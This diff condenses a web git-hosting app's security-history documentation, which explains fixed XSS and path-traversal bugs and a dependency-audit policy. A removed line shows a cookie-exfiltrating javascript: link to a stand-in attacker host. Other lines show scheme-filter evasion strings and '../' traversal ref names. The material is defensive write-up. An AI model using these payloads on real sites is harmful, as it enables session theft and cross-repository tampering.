@@ -3,273 +3,43 @@ title: "Security history"
 description: "How the security rules were arrived at, including the vulnerabilities behind them."
 ---
 
-How the invariants in [security.md](/docs/internals/security) were arrived at. Each section
-is the investigation that produced one of them, kept because the reasoning is
-what tells you whether a rule still applies when you change the code around it.
-The rules themselves — what must hold — live in [security.md](/docs/internals/security);
-this is the why.
-
-Nothing here is a current vulnerability. Where a section describes something
-that was exploitable, it was fixed in the same change that added its rule, and
-the rule is what keeps it fixed.
+Each section is the investigation that produced one invariant in [security.md](/docs/internals/security). The rule says what must hold; this says why, so you can tell whether it still applies when you change the code around it. Where something was exploitable it was fixed in the same change that added the rule, and the rule keeps it fixed.
 
 ## Stored XSS in markdown rendering
 
-`MarkdownRenderer` (`src/components/MarkdownRenderer.tsx`) renders content
-that is **fully attacker-controlled**: issue bodies, PR bodies, comments, and
-README files — anyone with write access to a repo can put arbitrary markdown in
-front of anyone who views that content.
+`MarkdownRenderer` renders fully attacker-controlled content: issue and PR bodies, comments, READMEs. Its link/image renderer used to emit a raw `<a href>`/`<img src>` for anything that did not match a known external or repo-reference pattern — exactly the case when no `branch` context is available, as in issue and comment bodies — so `[click me](javascript:…)` was a live link running in the viewer's authenticated session.
 
-The link/image renderer used to render a raw `<a href={href}>`/`<img
-src={src}>` for any href/src that didn't match a known "external" pattern and
-wasn't a recognized internal repo-reference link — reachable specifically when
-no `branch` context was available, which is exactly the case for issue/PR/
-comment bodies (they're rendered without a `branch` prop, only with `owner`/
-`name`). A comment containing `[click me](javascript:fetch('https://evil.example/steal?c='+document.cookie))`
-would render as a live `javascript:` link, executing in the viewer's
-authenticated session on click.
+**Fix**: `isSafeHref`/`isSafeImageSrc` gate every href/src as an allowlist, not a blocklist: no scheme is a relative reference (safe by construction), an explicit scheme only `http:`, `https:` or `mailto:` (plus `data:image/…` for images, which cannot execute script the way a `data:text/html` navigation can). Anything else is rejected by construction rather than by keeping a blocklist current.
 
-**Fix**: `isSafeHref`/`isSafeImageSrc` gate every href/src before it reaches a
-real DOM attribute. The rule is an **allowlist**, not a blocklist: a value with
-no scheme at all is a relative reference (safe by construction), and an explicit
-scheme is allowed only if it is `http:`, `https:` or `mailto:` — with `data:`
-allowed additionally for images, and only for `data:image/…`, since an `<img
-src="data:…">` cannot execute script the way an `<a href="data:text/html,…">`
-navigation can. Anything else — `javascript:`, `vbscript:`, `data:text/html`,
-whatever comes next — is rejected by construction rather than by keeping a
-blocklist up to date.
+**The subtle half is what "has no scheme" means.** The predicates cannot judge the literal prefix; they must judge what the browser's URL parser will do, and that parser removes ASCII tab and newline characters and strips leading C0 controls and spaces *before* it reads the scheme. `<java\tscript:alert(1)>` and `<\u0001javascript:alert(1)>` are therefore live `javascript:` URLs even though neither starts with `javascript:`, and the original prefix-anchored test called both "relative, safe". So a value containing a C0 control or space is now rejected before the scheme is considered. Nothing legitimate is lost, because a markdown destination cannot carry them.
 
-**The subtle half of that rule is what "has no scheme" means.** These
-predicates do not judge the value's literal prefix; they have to judge what the
-browser's URL parser will do with it. That parser removes every ASCII tab and
-newline from its input and strips leading C0 controls and spaces *before* it
-reads the scheme, so both `<java\tscript:alert(1)>` and
-`<\u0001javascript:alert(1)>` are live `javascript:` URLs even though neither
-starts with `javascript:`. A prefix-anchored scheme test returns "no scheme, so
-it's just a relative link" for both, and the original implementation did
-exactly that. So any value containing a C0 control or a space is now rejected
-outright, and only then is the scheme allowlisted. Nothing legitimate is lost: a
-markdown destination cannot carry a raw control character or space — the
-markdown parser percent-encodes them before the renderer sees the value.
-
-That percent-encoding is worth knowing about, because it is *not* part of this
-app's control and has silently neutralised these payloads all along: by the time
-`isSafeHref` runs, `java\tscript:…` has already become `java%09script:…`, and
-`%` is not a scheme character, so the browser resolves it as a relative path.
-`MarkdownRenderer.render.test.tsx` therefore asserts the *outcome* through the
-browser's own URL parser (`new URL(value, origin).protocol` is never
-`javascript:`) rather than trusting that encoding to keep happening. If a
-react-markdown upgrade, a `rehype-raw` addition, or a new caller ever stops
-pre-encoding a user-controlled href, the test says so.
-
-**If you touch this component**: any new place that renders a user-controlled
-href/src as a real attribute must go through these same two functions, and any
-new *source* of an href (JSON, a prop, an API field) must be judged knowing that
-it has not been through a markdown parser.
+That markdown parser pre-encodes those characters — `java\tscript:` arrives as `java%09script:`, which no browser resolves as a scheme — but that is not this app's control and could silently stop, so `MarkdownRenderer.render.test.tsx` asserts the *outcome* through the browser's own URL parser instead of trusting the encoding. If a react-markdown upgrade, a `rehype-raw` addition or a new caller stops pre-encoding a user-controlled href, the test says so.
 
 ## Path traversal via repository name
 
-`repositories.ts`'s `createRepository`/`updateRepository` used to validate the
-repo `name` field with only `z.string().min(1).max(100)` — no character
-restriction at all. That name becomes a segment of the repository's gitdir
-(`repos/{ownerKey}/{repoName}/git`), and every path isomorphic-git hands
-`gitFs` is normalized (`..` resolved) before it's mapped onto an R2 key — a
-repository named `..` would put its gitdir at `repos/git`, outside its owner's
-prefix; a name like `../victim/repo` would land inside another user's
-repository.
+Repository `name` was validated with only `z.string().min(1).max(100)`. The name is a segment of the gitdir (`repos/{ownerKey}/{repoName}/git`) and every path isomorphic-git hands `gitFs` is normalized (`..` resolved) before it becomes an R2 key, so a repository named `..` put its gitdir at `repos/git` and a name like `../victim/repo` landed inside another user's repository. S3 itself has no path resolution, but `gitFs` does and every git operation goes through it, so these segments are paths, not opaque strings.
 
-**Fix, at two layers** (defense in depth — don't remove either on the
-assumption the other covers it):
-
-1. **Input validation** — repository names (`repositories.ts`'s
-   `repoNameSchema`) and usernames (`auth.ts`'s `usernameValidator`) must
-   match `STORAGE_NAME_RE`, `/^[A-Za-z0-9](?:[A-Za-z0-9._-]*[A-Za-z0-9])?$/`:
-   alphanumeric at both ends, no `/` or `\`, so never `.` or `..`.
-2. **Key construction fails closed** — `git-storage-naming.ts` checks every
-   segment against the same pattern when building a key and throws instead
-   of sanitizing, so a caller that skipped validation can't reintroduce the
-   bug by omission. Usernames can't change, so a key never goes stale.
-
-S3 itself has no path resolution (`"repos/x/../y"` is a literal key), but
-`gitFs` does, and every git operation goes through it — so treat these
-segments as paths, not opaque strings.
+**Fix, at two layers**: names and usernames must match `STORAGE_NAME_RE` (alphanumeric at both ends, so never `.` or `..`), and key construction checks every segment against the same pattern and throws rather than sanitizing. Keep both: the second covers a caller that skips validation.
 
 ## Path traversal via git branch/ref names
 
-A separate, more severe traversal bug than the repository-name one above:
-**branch/ref names** — a git push's ref-update command, a branch name typed
-into the web UI, a pull request's source/target branch — reached several
-isomorphic-git primitives that, unlike `git.branch`/the top-level
-`git.writeRef`, **never validate the ref name themselves**:
-`git.commit`, `git.merge`, `git.deleteBranch`, and the top-level
-`git.resolveRef`/`git.deleteRef` all resolve straight through
-`fs.write`/`fs.rm(join(gitdir, ref))` (or the R2-backend equivalent) with no
-jail to the current repo's own directory.
+More severe than the name bug: ref names — a push's ref-update command, a branch typed into the web UI, a pull request's source or target branch — reached isomorphic-git primitives that never validate a ref name themselves (`git.commit`, `git.merge`, `git.deleteBranch`, `git.resolveRef`, `git.deleteRef`), resolving straight through `fs.write`/`fs.rm(join(gitdir, ref))`.
 
-That alone would be contained if the storage layer re-verified containment
-per repository — but it doesn't.
-The object-store `fs` (`git-fs.ts`, built on `git-fs-s3`'s `createGitFs`) has
-no notion of "which repo this request belongs to" — it's constructed with no
-key prefix (gitdirs are the full storage roots), and maps whatever path
-isomorphic-git hands it straight onto an R2 key, normalized only to resolve
-`.`/`..` segments and reject one that would escape the *store's own* root
-(`git-fs-s3`'s `normalizePath`) — not any specific repository's gitdir. Once a
-`../`-laden ref name collapses to a path like
-`repos/{victim-owner}/{victim-repo}/git/refs/heads/main`, the store
-reads/writes/deletes exactly that key — the *victim's* real ref file — even
-though the operation started against the attacker's own repo's `gitdir`. This
-was directly exploitable in production.
+That alone would be contained if the storage layer re-verified containment per repository, but it does not: the object-store `fs` is constructed with no key prefix and maps whatever path isomorphic-git hands it onto an R2 key, normalized only against the store's own root. A `../`-laden ref collapses to a path like `repos/{victim}/repo/git/refs/heads/main` and the store reads, writes or deletes exactly that key even though the operation started on the attacker's own repo. This was directly exploitable in production, through two ordinary paths:
 
-Two concrete ways this was reachable, both through the ordinary web UI (no
-git CLI, no raw HTTP crafting needed for the second one):
+1. **A push's receive-pack commands** passed the client-supplied `refName` straight to `resolveRef`/`deleteRef`/`writeRef`. `writeRef` validates internally; the other two do not, so a delete command naming a traversal ref with the all-zero old oid passed the compare-and-swap (a bad ref path reads as "does not exist yet") and deleted the victim's ref file.
+2. **Web-UI branch operations** (`uploadFile`, `deleteFile`, `createBranch`, `deleteBranch`, pull request branch fields) accepted a bare `z.string()`, so "delete branch" reached `git.deleteBranch`, and a traversal target branch merged by anyone with merge rights reached `git.merge`/`git.commit`.
 
-1. **`git push`'s receive-pack ref-update commands** — the client-supplied
-   `refName` in each `<oldOid> <newOid> <refName>` command line was passed
-   straight to `git.resolveRef`/`git.deleteRef`/`git.writeRef` in
-   the receive-pack handler. `git.writeRef` happens to validate internally, but
-   `git.deleteRef` and `git.resolveRef` don't — a ref-delete command with
-   `refName: "../../victim-owner/victim-repo/git/refs/heads/main"` and
-   `oldOid` set to the all-zero oid trivially passes the compare-and-swap
-   check (`resolveRef` on a non-well-formed-ref path fails and is treated as
-   "doesn't exist yet"), then deletes that file.
-2. **Web-UI branch operations** — `files.ts`'s `uploadFile`/`deleteFile`/
-   `createBranch`/`deleteBranch` and `pull-requests.ts`'s `createPullRequest`
-   all accepted `branchName`/`sourceBranchName`/`targetBranchName` as a bare
-   `z.string()` with no format restriction. "Delete branch" with a
-   traversal name reaches `git.deleteBranch` (no CAS check needed at all,
-   simpler to exploit than the push path above); a PR with a traversal
-   `targetBranchName`, once merged by anyone with merge rights, reaches
-   `git.merge`/`git.commit`.
+**Fix**: `isSafeFullRefName` (the `refs/heads/…`/`refs/tags/…` shape a push uses) and `isSafeBranchName` (the bare shape every other entry point uses, also rejecting anything that already looks like a full ref path), both on the character classes isomorphic-git's own `isValidRef` uses, applied at three layers: schema validation on every branch-shaped field, re-validation in `git-write.ts` immediately before isomorphic-git, and `applyRefUpdates` rejecting a bad push command with `ok: false, reason: "invalid ref name"`.
 
-**Fix**: `src/server/git-ref-name.ts` — `isSafeFullRefName` (for the
-`refs/heads/…`/`refs/tags/…` shape a push's `refName` takes) and
-`isSafeBranchName` (for the bare-name shape every other entry point takes,
-also rejecting anything that already looks like a full ref path, which would
-otherwise smuggle through unprefixed) — both built on the same character-class
-rules isomorphic-git's own internal `isValidRef` uses. Applied at every layer,
-matching the repository-name fix's defense-in-depth shape:
+## Path traversal via the raw-content route
 
-1. **Input validation** — `files.ts` and `pull-requests.ts` validate every
-   branch-name-shaped field with `safeBranchNameSchema` instead of a bare
-   `z.string()`.
-2. **Point of use** — `git-write.ts` re-validates every branch name
-   immediately before calling into isomorphic-git, so a future call site
-   that skips the zod schema can't reintroduce the bug by omission.
-3. **Receive-pack** — `git-fs-s3/http`'s `applyRefUpdates` validates every
-   ref-update command's `refName` with `isSafeFullRefName` before
-   `resolveRef`/`deleteRef`/`writeRef` run, rejecting the command with
-   `ok: false, reason: "invalid ref name"`.
+The raw-content route read its `ref` and `path` straight off the decoded URL and passed them into `getFileContent`. Being a route handler rather than a validated server function, it never ran the schemas, and `getFileContent` resolves `ref` with `git.resolveRef` — one of the non-validating primitives — through the normalizing `gitFs`, so a crafted `ref` could read another repository's data past that repository's read check, which had only ever validated the repo named in the URL.
 
-## Path traversal via the raw-content route's ref/path
+**Fix**: validate `ref` and `path` (`isSafeRefName`/`isSafeRepoPath`) before they reach the content layer and answer `404` otherwise. A new route handler that reads request path segments directly runs the same validators instead of assuming access control is enough.
 
-`/api/raw/{owner}/{repo}/{ref}/{...path}` (`src/server/raw.ts`, the "Raw"
-link and binary previews) reads its `ref` and `path` straight off the URL's
-decoded segments and passed them directly into `getFileContent` — unlike every other entry point in the
-app that accepts a branch-name- or path-shaped field, this route did **not**
-run them through `safeBranchNameSchema`/`safeRepoPathSchema` first, since it's
-a raw API route handler rather than one of `files.ts`'s validated
-`createServerFn`s.
-
-That resolves `ref` with the top-level `git.resolveRef` — one of the isomorphic-git primitives that (like
-`git.deleteRef`/`git.commit`/`git.merge` — see the ref-name section above)
-does not validate ref format internally. The read goes through `gitFs`, which
-resolves `../` components before mapping the path onto an R2 key (see the
-ref-name section above) — so a crafted `ref` could read another repository's
-ref/blob data, bypassing that repository's own read-access check
-entirely (the access check only ever validated access to the repo named in
-the URL's `{owner}/{repo}`, not whatever repo the traversal actually reads
-from).
-
-**Fix**: both `ref` and `path` are validated (`isSafeRefName` /
-`isSafeRepoPath`, `git-ref-name.ts`) before either reaches `getFileContent`,
-returning a 404 for anything invalid — same posture as every other
-branch/path field in the app. If you add a new route handler that reads
-request-supplied path segments directly (rather than through one of
-`files.ts`'s already-validated server functions), run them through these same
-validators rather than assuming access-control alone is enough.
-
-## Fixed: SHA-pinned blob viewing was rejected by the branch-name validator
-
-`isSafeBranchName` deliberately rejects any 40-hex-char value (to keep a
-*stored* branch name from ever being ambiguous with a commit SHA at write
-time — see its comment in `git-ref-name.ts`) — but `files.ts`'s read-path
-handlers (`getFile`, `listFiles`, `getLastCommits`, `getFileHistory`,
-`getCommits`) reused the same `safeBranchNameSchema` for their `branchName`
-field, which is also the field the blob page's **Permalink** button relies on
-being able to pass a full commit SHA (`/repo/{owner}/{name}/blob/{sha}/{path}`
-— see `isPinnedRevision` in that route). The result: viewing a file pinned to
-a specific commit threw a validation error before ever reaching the handler,
-which the blob page's `error || !file` check silently rendered as "File Not
-Found" — indistinguishable from the file genuinely not existing.
-
-**Fix**: `git-ref-name.ts` now also exports `isSafeRefName`/
-`safeRefNameSchema`, which accept *either* a valid branch name *or* a full
-40-hex commit SHA, still rejecting every unsafe shape either check would
-reject on its own. The read-path `branchName` fields above now use this;
-write-path fields (`uploadFile`, `deleteFile`, `createBranch`, `deleteBranch`,
-`getBranchDiff`, `createPullRequest`'s branch fields) keep the stricter
-`safeBranchNameSchema`, since a SHA is never a meaningful value there.
-`getCommit`/`getCommitDiff`'s `commitSha` field now uses a dedicated
-`safeCommitShaSchema` (exact 40-hex) instead of a bare `z.string()`, for the
-same defense-in-depth reason every other ref-shaped field is validated rather
-than trusted.
+Note the split these bugs forced: `isSafeBranchName` rejects 40-hex values so a stored branch name is never ambiguous with a commit SHA, which is why read paths that accept a pinned revision use `safeRefNameSchema` (a valid branch name *or* a full SHA) while write paths keep the stricter schema, and commit ids use `safeCommitShaSchema`.
 
 ## Dependency vulnerabilities
 
-As of 2026-10-19, pnpm 12 reports zero known vulnerabilities across both
-production and development dependencies, with no overrides or ignored
-advisories. The earlier remediation used overrides and advisory exclusions;
-those have all been removed.
-
-The dependency graph was repaired at its owners:
-
-- Removed the unused Cloudflare Vite plugin and its Wrangler/Miniflare graph.
-- Disabled automatic peer installation instead of installing Better Auth's
-  unused Prisma and other optional ORM peers.
-- Upgraded TanStack Start and the remaining direct dependencies to releases
-  that include patched transitive dependencies.
-- Replaced `@tailwindcss/typography` with app-owned Markdown CSS and removed
-  the installed `shadcn` CLI after vendoring its Tailwind utilities. This
-  removed the vulnerable selector-parser and braces chains.
-- Replaced tsup with tsdown in both library builds.
-- Upgraded Drizzle ORM and Kit together to 1.0.0-rc.4, removing the old
-  `@esbuild-kit` / esbuild dependency chain. Migrated relational queries and
-  programmatic schema pushes to the new APIs.
-
-Two earlier failures explain this policy. An open-ended `undici` override
-resolved to a new major whose internal paths were incompatible with jsdom,
-breaking the suite. Separately, pnpm 9.15.5 claimed package.json settings had
-moved to the workspace file, but moving the overrides silently disabled them
-and reintroduced vulnerable versions. These are historical observations,
-not instructions for pnpm 12: current settings belong in
-`pnpm-workspace.yaml`, and there are no overrides to maintain.
-
-For future findings, inspect the complete dependency path, upgrade or remove
-its owning dependency, and run audit, typecheck, tests, build and native-git
-smoke checks. A clean audit alone does not establish API compatibility.
-
-## A known, separate issue (not a vulnerability, but worth knowing)
-
-Blob routes for files ending in `.md` (e.g. viewing a `README.md` through the
-blob viewer) currently 404 before ever reaching the app's own router, with a
-raw connect-style `Cannot GET ...` body — confirmed via `pnpm dev` that this
-is specific to `.md` (a sibling request for the same nonexistent repo/path
-with a `.txt` extension, or no extension at all, both reach the app and hit
-the expected DB/repo-not-found error instead). Root cause is nitro's local
-Vercel-dev-emulation static-asset short-circuit misfiring for `.md`
-specifically — not yet traced to the exact line, since it isn't reproducible
-by grepping nitro's dist for any `.md`-specific handling.
-
-**This is very likely dev-only, not a production bug**: the actual generated
-`.vercel/output/config.json` routing (inspected directly after a real
-`pnpm build`) has no rule that treats `.md` specially — it's just the
-generic `publicAssets` cache-control rule plus `{ "handle": "filesystem" }`
-falling through to `/__server` for anything without a real matching file in
-`.vercel/output/static`. Since no build output ever contains a static file at
-a path like `/repo/{owner}/{repo}/blob/{branch}/README.md`, real Vercel
-routing's filesystem-handle step has nothing to match and should fall
-through to the SSR function correctly. The previous note in this doc
-speculating this "would also break in a real deployment" was not verified
-against the actual routing config and should not be treated as confirmed —
-if you're debugging a `.md`-related 404 in an actual deployed environment,
-treat it as a new finding rather than assuming this is the cause.
+`pnpm audit` and `pnpm audit --prod` report zero vulnerabilities, and the policy is to repair the graph at its owner: remove the unused plugin or peer graph, upgrade the dependency whose transitive dependency is vulnerable, replace a tool that drags in a bad chain. Broad overrides and advisory exclusions have failed twice — an open-ended `undici` override resolved to a major whose internal paths broke jsdom, and moving overrides into the workspace file silently disabled them and reintroduced vulnerable versions. A clean audit alone does not establish API compatibility: inspect the full path with `pnpm why`/`pnpm audit --json`, then run audit, typecheck, tests, build and the native-git smoke checks.
